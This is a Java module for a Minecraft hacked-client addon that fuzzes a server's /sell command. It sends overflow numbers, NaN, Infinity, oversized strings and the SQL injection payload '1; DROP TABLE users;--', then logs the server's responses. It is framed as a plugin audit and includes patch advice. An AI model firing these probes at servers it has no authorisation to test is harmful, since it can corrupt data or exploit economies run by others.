package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;

/**
 * AUDIT: Sell Command Fuzz (focused economy quantity edge cases)
 *
 * Cycles a compact set of edge-case values through the /sell command with a
 * configurable delay between sends: integer overflow, long overflow, NaN,
 * Infinity, empty string, very long strings, and SQL injection probes.
 *
 * This is the focused predecessor to EconFuzz: where EconFuzz covers 120+
 * values across many bypass categories, SellCommandFuzz covers the 14 most
 * commonly effective values for a quick first-pass test of a sell plugin.
 * Use SellCommandFuzz first to see if the plugin has any obvious gaps; use
 * EconFuzz for exhaustive coverage.
 *
 * Patch signal: parse the quantity inside a try/catch; reject values that are
 * not a valid positive finite integer before touching any balance or inventory;
 * use prepared statements for any SQL that handles the quantity. See EconFuzz
 * for a comprehensive list of attack values.
 */
public class SellCommandFuzz extends Module {
    private static final String[] FUZZ_VALUES = {
        "0", "-1",
        String.valueOf(Integer.MIN_VALUE),
        String.valueOf(Integer.MAX_VALUE),
        String.valueOf((long) Integer.MAX_VALUE + 1),
        String.valueOf(Long.MAX_VALUE),
        "9223372036854775808",
        "NaN", "Infinity", "", " ",
        "1; DROP TABLE users;--",
        "9".repeat(300),
        "1e9", "0x7FFFFFFF",
    };

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
    private final Setting<Integer> delayTicks = sgGeneral.add(new IntSetting.Builder()
        .name("delay-ticks").description("Ticks between each command send (20 = 1 second).")
        .defaultValue(20).range(1, 200).sliderRange(1, 100).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );
    private int ticksActive = 0, packetsSent = 0;

    private int index = 0;
    private int timer = 0;
    private String lastFuzzValue = null;

    public SellCommandFuzz() {
        super(AddonTemplate.CRASH_CATEGORY, "sell-command-fuzz",
            "Cycles edge-case quantities through /sell. Tests integer parsing and injection hardening.");
    }

    @Override
    public void onActivate() { ticksActive = 0; packetsSent = 0;
        index = 0;
        timer = 0;
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        if (timer > 0) { timer--; return; }
        lastFuzzValue = FUZZ_VALUES[index % FUZZ_VALUES.length];
        mc.player.networkHandler.sendChatCommand("sell " + lastFuzzValue);
        packetsSent++;

        index++;
        timer = delayTicks.get();
        if (index >= FUZZ_VALUES.length) toggle();
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) {
        if (!(event.packet instanceof GameMessageS2CPacket msg)) return;
        String text = msg.content().getString();
        if (!text.isBlank()) info("[Response to '%s'] %s", lastFuzzValue, text);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
